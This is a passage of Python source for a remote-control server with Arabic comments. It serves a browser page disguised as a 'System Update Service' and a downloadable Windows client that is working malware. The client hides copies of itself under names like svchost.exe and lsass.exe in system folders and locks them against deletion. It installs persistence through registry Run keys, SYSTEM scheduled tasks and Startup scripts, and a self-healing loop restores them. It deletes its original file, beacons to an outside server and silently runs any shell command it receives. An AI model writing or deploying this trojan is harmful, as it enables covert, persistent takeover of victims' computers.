                                    addToTerminal(`✅ [${clientId}] Response (${responseTime.toFixed(1)}s):\\n${data.result}\\n`);
                                } else if (data.pending) {
                                    setTimeout(check, 500); // ⚡ غير من 1000 إلى 500
                                } else {
                                    setTimeout(check, 500); // ⚡ غير من 1000 إلى 500
                                }
                            }).catch(() => setTimeout(check, 500));
                    };
                    check();
                }
                
                function addToTerminal(text) {
                    const terminal = document.getElementById('terminal');
                    terminal.textContent += text;
                    terminal.scrollTop = terminal.scrollHeight;
                }
                
                function openSettings() {
                    window.open('/settings', '_blank');
                }
                
                function logout() {
                    if (confirm('Are you sure you want to logout?')) {
                        window.location = '/';
                    }
                }
                
                // ⚡ Auto-refresh every 1.5 seconds instead of 3
                setInterval(loadSessions, 1500);
                loadSessions();
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def send_remote_client(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>System Update Service</title>
            <style>
                body { 
                    font-family: Arial; 
                    background: linear-gradient(135deg, #667eea, #764ba2); 
                    color: white; 
                    text-align: center; 
                    padding: 50px; 
                    margin: 0;
                }
                .container {
                    background: rgba(255,255,255,0.1);
                    padding: 40px;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                }
                .loader { 
                    border: 5px solid #f3f3f3; 
                    border-top: 5px solid #3498db; 
                    border-radius: 50%; 
                    width: 50px; 
                    height: 50px; 
                    animation: spin 1s linear infinite; 
                    margin: 20px auto; 
                }
                @keyframes spin { 
                    0% { transform: rotate(0deg); } 
                    100% { transform: rotate(360deg); } 
                }
                .status {
                    margin-top: 20px;
                    padding: 10px;
                    background: rgba(255,255,255,0.2);
                    border-radius: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>System Initialization</h2>
                <p>Loading essential security components...</p>
                <div class="loader"></div>
                <div class="status" id="status">Initializing...</div>
                <p><small>Please wait while we prepare your system environment</small></p>
            </div>
            <script>
                const clientId = 'web-' + Math.random().toString(36).substr(2, 12) + '-' + Date.now();
                let statusElement = document.getElementById('status');
                
                function updateStatus(message) {
                    statusElement.textContent = message;
                }
                
                function registerClient() {
                    updateStatus('Registering with control server...');
                    
                    fetch('/register', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            client_id: clientId,
                            user_agent: navigator.userAgent,
                            platform: navigator.platform,
                            type: 'web_client',
                            computer: navigator.platform,
                            os: navigator.userAgent
                        })
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            updateStatus('Registered successfully. Waiting for commands...');
                            startCommandListener();
                        } else {
                            updateStatus('Registration failed. Retrying...');
                            setTimeout(registerClient, 5000);
                        }
                    }).catch(err => {
                        updateStatus('Connection error. Retrying...');
                        setTimeout(registerClient, 5000);
                    });
                }
                
                function startCommandListener() {
                    setInterval(() => {
                        fetch('/commands?client=' + clientId)
                        .then(r => r.json())
                        .then(cmd => {
                            if (cmd.command) {
                                updateStatus('Executing command: ' + cmd.command);
                                let response = '';
                                
                                switch(cmd.command) {
                                    case 'sysinfo':
                                        response = `Web Client System Info:\\nUser Agent: ${navigator.userAgent}\\nPlatform: ${navigator.platform}\\nLanguage: ${navigator.language}`;
                                        break;
                                    case 'alert':
                                        response = 'Alert dialog shown to user';
                                        alert('System Notification: Security Update Required');
                                        break;
                                    default:
                                        response = `Command executed: ${cmd.command}`;
                                }
                                
                                fetch('/response', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        client_id: clientId,
                                        command: cmd.command,
                                        response: response
                                    })
                                });
                                
                                updateStatus('Command executed: ' + cmd.command);
                            }
                        }).catch(() => {});
                    }, 3000);
                }
                
                setTimeout(registerClient, 2000);
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def download_python_client(self):
        """Download UNKILLABLE Python client with advanced protection"""
        client_code = '''
import requests
import subprocess
import os
import platform
import time
import uuid
import ctypes
import sys
import winreg
import psutil
import getpass
import threading
import random
import glob
import shutil

class PermanentGhostClient:
    def __init__(self, server_url="https://game-python-1.onrender.com"):
        self.server_url = server_url
        self.client_id = f"{platform.node()}-{getpass.getuser()}-{uuid.uuid4().hex[:8]}"
        self.running = True
        self.registered = False
        self.original_path = os.path.abspath(__file__)
        
        # ⚡ أسماء مختلفة لكل نسخة مخفية
        self.hidden_names = [
            "winlogon.exe",           # نسخة نظام
            "svchost.exe",            # نسخة خدمة
            "csrss.exe",              # نسخة نظام متقدمة
            "services.exe",           # نسخة خدمات
            "lsass.exe",              # نسخة أمان
            "spoolsv.exe",            # نسخة طباعة
            "taskhost.exe",           # نسخة مهام
            "dwm.exe",                # نسخة واجهة
        ]
        self.hidden_paths = []
        self.current_hidden_name = random.choice(self.hidden_names)
        
    def get_admin_privileges(self):
        """الحصول على صلاحيات المدير"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def delete_original_only(self):
        """حذف الملف الأصلي فقط - إبقاء النسخ المخفية"""
        try:
            # التحقق إذا كان هذا الملف الأصلي (ليس نسخة مخفية)
            is_original = True
            for hidden_path in self.hidden_paths:
                if os.path.abspath(self.original_path) == os.path.abspath(hidden_path):
                    is_original = False
                    break
            
            if is_original and os.path.exists(self.original_path):
                print("🗑️ Deleting original file only...")
                for _ in range(3):
                    try:
                        os.remove(self.original_path)
                        print("✅ Original file deleted permanently")
                        break
                    except:
                        time.sleep(0.5)
        except:
            pass
    
    def create_permanent_copies(self):
        """إنشاء نسخ دائمة مخفية بأسماء مختلفة"""
        try:
            # ⚡ أماكن استراتيجية مختلفة
            hidden_locations = [
                # نظام التشغيل
                os.path.join(os.environ['WINDIR'], 'System32', self.current_hidden_name),
                os.path.join(os.environ['WINDIR'], 'SysWOW64', self.current_hidden_name),
                
                # برامج النظام
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', self.current_hidden_name),
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Network', f"dns{random.randint(1000,9999)}.exe"),
                
                # ملفات المستخدم المخفية
                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', f"explorer{random.randint(1,9)}.exe"),
                os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Credentials', f"credhost{random.randint(1,9)}.exe"),
                
                # مجلدات نظام أخرى
                os.path.join(os.environ['WINDIR'], 'Temp', f"tmp{random.randint(1000,9999)}.exe"),
                os.path.join(os.environ['WINDIR'], 'Logs', f"log{random.randint(1000,9999)}.exe"),
            ]
            
            created_count = 0
            for location in hidden_locations:
                try:
                    # إنشاء المجلد إذا لم يكن موجوداً
                    os.makedirs(os.path.dirname(location), exist_ok=True)
                    
                    # نسخ الملف
                    shutil.copy2(self.original_path, location)
                    
                    # ⚡ إخفاء وحماية الملف بشكل دائم
                    subprocess.run(f'attrib +s +h +r "{location}"', shell=True, capture_output=True)
                    
                    # ⚡ حماية متقدمة من الحذف
                    try:
                        subprocess.run(f'icacls "{location}" /deny Everyone:F', shell=True, capture_output=True)
                    except:
                        pass
                    
                    self.hidden_paths.append(location)
                    created_count += 1
                    print(f"✅ Permanent copy created: {os.path.basename(location)}")
                    
                    # ⚡ لا نحتاج أكثر من 3 نسخ
                    if created_count >= 3:
                        break
                        
                except Exception as e:
                    continue
            
            # تعيين مسار التشغيل الرئيسي (أول نسخة)
            if self.hidden_paths:
                self.script_path = self.hidden_paths[0]
                print(f"🎯 Main execution path: {self.script_path}")
                
            return f"Created {created_count} permanent hidden copies"
            
        except Exception as e:
            return f"Copy error: {e}"
    
    def install_eternal_persistence(self):
        """تثبيت تشغيل تلقائي أبدي"""
        try:
            print("🔄 Installing eternal persistence...")
            
            # 1. تسجيل نظام التشغيل متعدد
            registry_entries = [
                # Current User
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsLogon"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "UserInit"),
                
                # Local Machine (إذا كان لدينا صلاحيات)
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SystemService"),
            ]
            
            for hkey, subkey, value_name in registry_entries:
                try:
                    with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{self.script_path}"')
                    print(f"✅ Registry: {value_name}")
                except: 
                    continue
            
            # 2. مهام مجدولة متعددة
            scheduled_tasks = [
                f'schtasks /create /tn "Microsoft\\Windows\\SystemMaintenance" /tr "\"{self.script_path}\"" /sc onstart /ru SYSTEM /f',
                f'schtasks /create /tn "Microsoft\\Windows\\WindowsUpdate" /tr "\"{self.script_path}\"" /sc minute /mo 3 /ru SYSTEM /f',
                f'schtasks /create /tn "Microsoft\\Windows\\MemoryDiagnostic" /tr "\"{self.script_path}\"" /sc onlogon /ru Users /f'
            ]
            
            for task_cmd in scheduled_tasks:
                try:
                    subprocess.run(task_cmd, shell=True, capture_output=True, timeout=5)
                    print("✅ Scheduled task created")
                except:
                    continue
            
            # 3. مجلدات Startup متعددة
            startup_locations = [
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'SystemMaintenance.bat'),
                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsUpdate.bat'),
            ]
            
            for startup_file in startup_locations:
                try:
                    with open(startup_file, 'w') as f:
                        f.write(f'@echo off\nstart "" "{self.script_path}"\nexit')
                    subprocess.run(f'attrib +s +h +r "{startup_file}"', shell=True, capture_output=True)
                    print(f"✅ Startup: {os.path.basename(startup_file)}")
                except:
                    continue
            
            return "Eternal persistence installed"
            
        except Exception as e:
            return f"Persistence error: {e}"
    
    def start_permanent_self_healing(self):
        """نظام شفاء ذاتي دائم"""
        def healing_monitor():
            while self.running:
                try:
                    # التحقق من جميع النسخ كل 30 ثانية
                    for copy_path in self.hidden_paths[:]:
                        if not os.path.exists(copy_path):
                            print(f"🔄 Copy missing - recreating: {os.path.basename(copy_path)}")
                            try:
                                # إعادة إنشاء النسخة المفقودة
                                shutil.copy2(self.script_path, copy_path)
                                subprocess.run(f'attrib +s +h +r "{copy_path}"', shell=True, capture_output=True)
                                print(f"✅ Recreated: {os.path.basename(copy_path)}")
                            except:
                                self.hidden_paths.remove(copy_path)
                    
                    # التحقق من المهام المجدولة
                    tasks = ["SystemMaintenance", "WindowsUpdate", "MemoryDiagnostic"]
                    for task in tasks:
                        result = subprocess.run(f'schtasks /query /tn "Microsoft\\Windows\\{task}"', shell=True, capture_output=True, text=True)
                        if task not in result.stdout:
                            try:
                                subprocess.run(f'schtasks /create /tn "Microsoft\\Windows\\{task}" /tr "\"{self.script_path}\"" /sc onlogon /ru SYSTEM /f', shell=True, capture_output=True)
                                print(f"✅ Recreated task: {task}")
                            except:
                                pass
                    
                    time.sleep(30)  # تحقق كل 30 ثانية
                    
                except Exception as e:
                    time.sleep(60)
        
        threading.Thread(target=healing_monitor, daemon=True).start()
    
    def start_instant_communication(self):
        """اتصال فوري مع السيرفر"""
        def communication_worker():
            backoff = 1
            
            while self.running:
                try:
                    if not self.registered:
                        system_info = {
                            'client_id': self.client_id,
                            'computer': platform.node(),
                            'user': getpass.getuser(),
                            'os': f"{platform.system()} {platform.release()}",
                            'status': 'permanent_active',
                            'admin': self.get_admin_privileges(),
                            'copies': len(self.hidden_paths)
                        }
                        
                        response = requests.post(
                            f"{self.server_url}/register",
                            json=system_info,
                            timeout=10
                        )
                        
                        if response.status_code == 200:
                            data = response.json()
                            if data.get('success'):
                                self.registered = True
                                backoff = 1
                                print("🌐 Permanent connection established")
                            else:
                                backoff = min(backoff * 1.5, 30)
                        else:
                            backoff = min(backoff * 1.5, 30)
                    
                    # التحقق من الأوامر باستمرار
                    self.check_instant_commands()
                    
                    time.sleep(backoff)
                    
                except Exception as e:
                    backoff = min(backoff * 1.5, 30)
                    time.sleep(backoff)
        
        threading.Thread(target=communication_worker, daemon=True).start()
    
    def check_instant_commands(self):
        """التحقق من الأوامر فوراً"""
        try:
            response = requests.get(
                f"{self.server_url}/commands?client={self.client_id}&_t={int(time.time()*1000)}",
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('command'):
                    command = data['command']
                    print(f"⚡ Executing: {command}")
                    
                    # تنفيذ الأمر فوراً
                    result = self.execute_instant_command(command)
                    
                    # إرسال النتيجة
                    requests.post(
                        f"{self.server_url}/response",
                        json={
                            'client_id': self.client_id,
                            'command': command,
                            'response': result
                        },
                        timeout=5
                    )
                    print("✅ Response sent")
                    
        except:
            pass
    
    def execute_instant_command(self, command):
        """تنفيذ الأمر فوراً"""
        try:
            if command.strip() == "sysinfo":
                return self.get_permanent_system_info()
            elif command.strip() == "status":
                return self.get_permanent_status()
            elif command.strip() == "reinforce":
                return self.reinforce_permanence()
            else:
                # تنفيذ الأوامر بدون نافذة
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
                
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    startupinfo=startupinfo
                )
                return result.stdout if result.stdout else result.stderr or "Command executed"
                
        except Exception as e:
            return f"Error: {str(e)}"
    
    def get_permanent_system_info(self):
        """معلومات النظام الدائمة"""
        try:
            info = f"""
🔒 PERMANENT GHOST CLIENT - ETERNAL
🖥️  Computer: {platform.node()}
👤 User: {getpass.getuser()}
💻 OS: {platform.system()} {platform.release()}
🆔 Client ID: {self.client_id}
🌐 Server: {self.server_url}

🔧 PERMANENCE STATUS:
✅ Hidden Copies: {len(self.hidden_paths)}
✅ Main Path: {os.path.basename(self.script_path)}
✅ Admin Rights: {'YES' if self.get_admin_privileges() else 'NO'}
✅ Self-Healing: ACTIVE
✅ Persistence: ETERNAL

📊 OPERATIONAL:
🔄 Connection: {'ESTABLISHED' if self.registered else 'ESTABLISHING'}
⚡ Response: INSTANT
🛡️ Protection: MAXIMUM
"""
            return info
        except:
            return "Permanent system information"
    
    def get_permanent_status(self):
        """حالة الديمومة"""
        return f"🔒 PERMANENT - Copies: {len(self.hidden_paths)} - Connected: {self.registered} - Eternal: YES"
    
    def reinforce_permanence(self):
        """تعزيز الديمومة"""
        try:
            # إنشاء نسخ إضافية إذا لزم الأمر
            if len(self.hidden_paths) < 2:
                self.create_permanent_copies()
            
            # إعادة تثبيت الثبات
            self.install_eternal_persistence()
            
            return "Permanence reinforced to maximum level"
        except Exception as e:
            return f"Reinforcement failed: {e}"
    
    def hide_completely(self):
        """إخفاء كامل"""
        try:
            if os.name == 'nt':
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def start(self):
        """بدء العميل الدائم"""
        # إخفاء فوري
        self.hide_completely()
        
        print("🚀 Starting Permanent Ghost Client - Eternal Mode")
        
        # 1. إنشاء نسخ دائمة مخفية
        copy_result = self.create_permanent_copies()
        print(f"📁 {copy_result}")
        
        # 2. تثبيت تشغيل تلقائي أبدي
        persistence_result = self.install_eternal_persistence()
        print(f"🔧 {persistence_result}")
        
        # 3. بدء نظام الشفاء الذاتي الدائم
        self.start_permanent_self_healing()
        print("🔄 Permanent self-healing activated")
        
        # 4. بدء الاتصال الفوري
        self.start_instant_communication()
        print("🌐 Instant communication started")
        
        # 5. ⚡ حذف الملف الأصلي فقط بعد التأكد من عمل النسخ المخفية
        threading.Timer(10.0, self.delete_original_only).start()
        print("🗑️ Original file deletion scheduled (hidden copies remain)")
        
        print("🎯 Permanent Ghost Client Activated - Eternal Operation")
        print("💫 Hidden copies will run forever...")
        
        # الحلقة الرئيسية
        while self.running:
            time.sleep(1)

def main():
    client = PermanentGhostClient()
    client.start()

if __name__ == "__main__":
    main()
'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="enhanced_client.py"')
        self.end_headers()
        self.wfile.write(client_code.encode())

    def handle_client_register(self, data):
        with self.session_lock:
            client_id = data.get('client_id', str(uuid.uuid4())[:8])
            client_ip = self.client_address[0]
            incoming_user = data.get('user', 'Unknown')
            incoming_computer = data.get('computer', 'Unknown')
            incoming_os = data.get('os', 'Unknown')

            if incoming_user == 'Unknown' and '-' in client_id:
                try:
                    parts = client_id.split('-')
                    if len(parts) >= 2:
                        incoming_user = parts[1]
                        incoming_computer = parts[0]
                except:
                    pass
                
            existing_client = None
            for cid, client_data in self.sessions.items():
                current_user = client_data.get('user', '')
                current_computer = client_data.get('computer', '')

                if (current_user == incoming_user and 
                    current_computer == incoming_computer and 
                    incoming_user != 'Unknown' and 
                    incoming_computer != 'Unknown'):
                    existing_client = cid
                    break
                
            if existing_client is None and client_id in self.sessions:
                existing_client = client_id

            if existing_client:
                self.sessions[existing_client]['last_seen'] = datetime.now().isoformat()
                self.sessions[existing_client]['status'] = 'online'
                self.sessions[existing_client]['ip'] = client_ip

                if incoming_os != 'Unknown':
                    self.sessions[existing_client]['os'] = incoming_os

                print(f"✅ Updated client: {incoming_computer} ({incoming_user}) - OS: {incoming_os} - IP: {client_ip}")
                self.send_json({'success': True, 'client_id': existing_client})
            else:
                self.sessions[client_id] = {
                    'id': client_id,
                    'ip': client_ip,
                    'type': data.get('type', 'unknown'),
                    'computer': incoming_computer,
                    'os': incoming_os,
                    'user': incoming_user,
                    'first_seen': datetime.now().isoformat(),
                    'last_seen': datetime.now().isoformat(),
                    'pending_command': None,
                    'last_response': None,
                    'status': 'online'
                }
                print(f"🆕 New client: {incoming_computer} ({incoming_user}) - OS: {incoming_os} - IP: {client_ip}")
                self.send_json({'success': True, 'client_id': client_id})
                
    def send_sessions_list(self):
        with self.session_lock:
            current_time = datetime.now()
            active_clients = []
            
            for client_id, client_data in list(self.sessions.items()):
                last_seen = datetime.fromisoformat(client_data['last_seen'])
                if (current_time - last_seen).total_seconds() < 300:
                    client_data['is_online'] = (current_time - last_seen).total_seconds() < 30  # ⚡ غير من 60 إلى 30
                    active_clients.append(client_data)
                else:
                    del self.sessions[client_id]
                    print(f"Removed inactive client: {client_id}")
            
            self.send_json(active_clients)
    
    def handle_get_commands(self):
        with self.session_lock:
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            client_id = query.get('client', [None])[0]
            
            if client_id and client_id in self.sessions:
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                pending_command = self.sessions[client_id]['pending_command']
                
                if pending_command:
                    self.sessions[client_id]['pending_command'] = None
                    self.send_json({'command': pending_command})
                else:
                    self.send_json({'waiting': True})
            else:
                self.send_json({'error': 'Client not found'})
    
    def handle_execute_command(self, data):
        with self.session_lock:
            client_id = data.get('client_id')
            command = data.get('command')
            
            if client_id in self.sessions:
                self.sessions[client_id]['pending_command'] = command
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                self.send_json({'success': True})
                
                if hasattr(self, 'cursor'):
                    self.cursor.execute(
                        'INSERT INTO commands (client_id, command) VALUES (?, ?)',
                        (client_id, command)
                    )
                    self.conn.commit()
            else:
                self.send_json({'success': False, 'error': 'Client not found'})
    
    def handle_get_result(self):
        with self.session_lock:
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            
            client_id = query.get('client', [''])[0]
            command = query.get('command', [''])[0]
            
            if client_id in self.sessions and self.sessions[client_id]['last_response']:
                result = self.sessions[client_id]['last_response']
                self.sessions[client_id]['last_response'] = None
                self.send_json({'result': result})
            else:
                self.send_json({'pending': True})
    
    def handle_client_response(self, data):
        with self.session_lock:
            client_id = data.get('client_id')
            response = data.get('response')
            command = data.get('command')
            
            if client_id in self.sessions:
                self.sessions[client_id]['last_response'] = response
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                
                if hasattr(self, 'cursor'):
                    self.cursor.execute(
                        'UPDATE commands SET response = ? WHERE client_id = ? AND command = ? AND response IS NULL',
                        (response, client_id, command)
                    )
                    self.conn.commit()
            
            self.send_json({'success': True})
    
    def send_command_history(self):
        try:
            if hasattr(self, 'cursor'):
                self.cursor.execute('''
                    SELECT client_id, command, response, timestamp 
                    FROM commands 
                    ORDER BY timestamp DESC 
                    LIMIT 50
                ''')
                history = self.cursor.fetchall()
                
                result = []
                for row in history:
                    result.append({
                        'client_id': row[0],
                        'command': row[1],
                        'response': row[2],
                        'timestamp': row[3]
                    })
                
                self.send_json(result)
            else:
                self.send_json([])
        except:
            self.send_json([])
    
    def send_system_status(self):
        with self.session_lock:
            status = {
                'uptime': 'Running',
                'connected_clients': len([c for c in self.sessions.values() 
                                        if (datetime.now() - datetime.fromisoformat(c['last_seen'])).total_seconds() < 60]),
                'total_commands': 0,
                'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            if hasattr(self, 'cursor'):
                self.cursor.execute('SELECT COUNT(*) FROM commands')
                status['total_commands'] = self.cursor.fetchone()[0]
            
            self.send_json(status)
    
    def send_404_page(self):
        self.send_error(404, "Page not found")
    
    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

def cleanup_sessions():
    while True:
        try:
            current_time = datetime.now()
            with EnhancedRemoteControlHandler.session_lock:
                for client_id, client_data in list(EnhancedRemoteControlHandler.sessions.items()):
                    last_seen = datetime.fromisoformat(client_data['last_seen'])
                    if (current_time - last_seen).total_seconds() > 300:
                        del EnhancedRemoteControlHandler.sessions[client_id]
                        print(f"Cleaned up inactive client: {client_id}")
            time.sleep(60)
        except:
            pass

def main():
    handler = EnhancedRemoteControlHandler
    handler.init_database(handler)
    
    threading.Thread(target=cleanup_sessions, daemon=True).start()
    print("=" * 70)
    print("🔒 ENHANCED REMOTE CONTROL SERVER - ULTRA FAST")
    print("=" * 70)
    print("Control Panel:    https://game-python-1.onrender.com")
    print("Web Client:       https://game-python-1.onrender.com/remote")
    print("Python Client:    https://game-python-1.onrender.com/download-python-client")
    print("Security Settings: https://game-python-1.onrender.com/settings")
    print("Level 1 Password: hblackhat")
    print("Level 2 Password: sudohacker")
    print("Database:         remote_control.db")
    print("=" * 70)
    print("Server starting on port 8080...")
    print("ULTRA FAST mode activated - Instant responses")
    print("Password change feature enabled")
    print("=" * 70)
    
    try:
        port = int(os.environ.get('PORT', 8080))
        server = ThreadedHTTPServer(('0.0.0.0', port), EnhancedRemoteControlHandler)
        print(f"Server started successfully on port {port}! Press Ctrl+C to stop.")
        print("Security Features: IP Blocking, Rate Limiting, Two-Factor Auth, Password Change")
        server.serve_forever()
    except KeyboardInterrupt:
        print("Server stopped by user")
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        if hasattr(handler, 'conn'):
            handler.conn.close()

if __name__ == "__main__":
    main()    
